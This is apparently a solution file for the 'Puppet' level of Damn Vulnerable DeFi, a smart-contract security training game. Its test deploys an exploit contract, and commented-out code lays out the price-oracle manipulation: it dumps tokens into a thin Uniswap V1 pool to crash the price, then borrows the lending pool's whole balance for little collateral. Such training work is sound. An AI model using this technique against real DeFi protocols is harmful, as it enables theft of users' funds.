// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {PuppetPool} from "../../src/puppet/PuppetPool.sol";
import {IUniswapV1Exchange} from "../../src/puppet/IUniswapV1Exchange.sol";
import {IUniswapV1Factory} from "../../src/puppet/IUniswapV1Factory.sol";
import {Multicall3} from "lib/multicall/src/Multicall3.sol";
import {PuppetExploit} from "./PuppetExploit.sol";

contract PuppetChallenge is Test {
    address deployer = makeAddr("deployer");
    address recovery = makeAddr("recovery");
    address player;
    uint256 playerPrivateKey;

    uint256 constant UNISWAP_INITIAL_TOKEN_RESERVE = 10e18;
    uint256 constant UNISWAP_INITIAL_ETH_RESERVE = 10e18;
    uint256 constant PLAYER_INITIAL_TOKEN_BALANCE = 1000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 25e18;
    uint256 constant POOL_INITIAL_TOKEN_BALANCE = 100_000e18;

    DamnValuableToken token;
    PuppetPool lendingPool;
    IUniswapV1Exchange uniswapV1Exchange;
    IUniswapV1Factory uniswapV1Factory;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        (player, playerPrivateKey) = makeAddrAndKey("player");

        startHoax(deployer);

        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);

        // Deploy a exchange that will be used as the factory template
        IUniswapV1Exchange uniswapV1ExchangeTemplate =
            IUniswapV1Exchange(deployCode(string.concat(vm.projectRoot(), "/builds/uniswap/UniswapV1Exchange.json")));

        // Deploy factory, initializing it with the address of the template exchange
        uniswapV1Factory = IUniswapV1Factory(deployCode("builds/uniswap/UniswapV1Factory.json"));
        uniswapV1Factory.initializeFactory(address(uniswapV1ExchangeTemplate));

        // Deploy token to be traded in Uniswap V1
        token = new DamnValuableToken();

        // Create a new exchange for the token
        uniswapV1Exchange = IUniswapV1Exchange(uniswapV1Factory.createExchange(address(token)));

        // Deploy the lending pool
        lendingPool = new PuppetPool(address(token), address(uniswapV1Exchange));

        // Add initial token and ETH liquidity to the pool
        token.approve(address(uniswapV1Exchange), UNISWAP_INITIAL_TOKEN_RESERVE);
        uniswapV1Exchange.addLiquidity{value: UNISWAP_INITIAL_ETH_RESERVE}(
            0, // min_liquidity
            UNISWAP_INITIAL_TOKEN_RESERVE,
            block.timestamp * 2 // deadline
        );

        token.transfer(player, PLAYER_INITIAL_TOKEN_BALANCE);
        token.transfer(address(lendingPool), POOL_INITIAL_TOKEN_BALANCE);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public {
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(uniswapV1Exchange.factoryAddress(), address(uniswapV1Factory));
        assertEq(uniswapV1Exchange.tokenAddress(), address(token));
        assertEq(
            uniswapV1Exchange.getTokenToEthInputPrice(1e18),
            _calculateTokenToEthInputPrice(1e18, UNISWAP_INITIAL_TOKEN_RESERVE, UNISWAP_INITIAL_ETH_RESERVE)
        );
        assertEq(lendingPool.calculateDepositRequired(1e18), 2e18);
        assertEq(lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE), POOL_INITIAL_TOKEN_BALANCE * 2);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_puppet() public checkSolvedByPlayer {
        PuppetExploit exploitContract = new PuppetExploit();
        token.approve(address(exploitContract), PLAYER_INITIAL_TOKEN_BALANCE);
        exploitContract.exploit{value: PLAYER_INITIAL_ETH_BALANCE}(
            token,
            uniswapV1Exchange,
            lendingPool,
            recovery
        );

    
        // token.approve(address(uniswapV1Exchange), PLAYER_INITIAL_TOKEN_BALANCE);
        // // console.log("Player ETH balance before swap:", player.balance / 1e18);
        // // console.log(
        // //     "Uniswap ETH reserve before swap:",
        // //     address(uniswapV1Exchange).balance / 1e18
        // // );
        // console.log(
        //     "Uniswap token reserve before swap:",
        //     token.balanceOf(address(uniswapV1Exchange)) / 1e18
        // );
        // console.log(
        //     "player token balance before borrow:",
        //     token.balanceOf(player) / 1e18
        // );
        // uniswapV1Exchange.tokenToEthSwapInput(
        //     PLAYER_INITIAL_TOKEN_BALANCE,
        //     1, // min eth
        //     block.timestamp * 2 // deadline
        // );
        //   uint256 poolTokenBalance = token.balanceOf(address(lendingPool));
        // uint256 depositRequired = lendingPool.calculateDepositRequired(poolTokenBalance);

       
        // lendingPool.borrow{value: depositRequired}(poolTokenBalance,recovery);
        // Transfer all tokens from player to recovery account
        // token.transfer(recovery, token.balanceOf(player));

    //     Multicall3  multicall3 = new Multicall3();
       
    //      Multicall3.Call3[] memory calls = new Multicall3.Call3[](3);
        
    //     bytes memory approveData = abi.encodeWithSignature(
    //     "approve(address,uint256)",
    //     address(uniswapV1Exchange),
    //     PLAYER_INITIAL_TOKEN_BALANCE
    //    );

    //     calls[0] = Multicall3.Call3({
    //         target: address(token),
    //         allowFailure: false,  // 必须成功
    //         callData:approveData
    //     });
    //     bytes memory swapData = abi.encodeWithSignature(
    //         "tokenToEthSwapInput(uint256,uint256,uint256)",
    //          PLAYER_INITIAL_TOKEN_BALANCE,
    //         1,
    //         block.timestamp * 2
    //     );
    //     calls[1] = Multicall3.Call3({
    //         target: address(uniswapV1Exchange),
    //         allowFailure: false,  // 必须成功
    //         callData:swapData
    //     });
    //     calls[2] = Multicall3.Call3({
    //         target: address(lendingPool),
    //         allowFailure: false,  // 必须成功
    //         callData:abi.encodeWithSignature(
    //         "borrow(uint256,address)",
    //         poolTokenBalance,
    //         recovery
    //     )
    //     });
        
    //     multicall3.aggregate3(calls);
        
    }

    // Utility function to calculate Uniswap prices
    function _calculateTokenToEthInputPrice(uint256 tokensSold, uint256 tokensInReserve, uint256 etherInReserve)
        private
        pure
        returns (uint256)
    {
        return (tokensSold * 997 * etherInReserve) / (tokensInReserve * 1000 + tokensSold * 997);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player executed a single transaction
        assertEq(vm.getNonce(player), 1, "Player executed more than one tx");

        // All tokens of the lending pool were deposited into the recovery account
        assertEq(token.balanceOf(address(lendingPool)), 0, "Pool still has tokens");
        assertGe(token.balanceOf(recovery), POOL_INITIAL_TOKEN_BALANCE, "Not enough tokens in recovery account");
    }
}
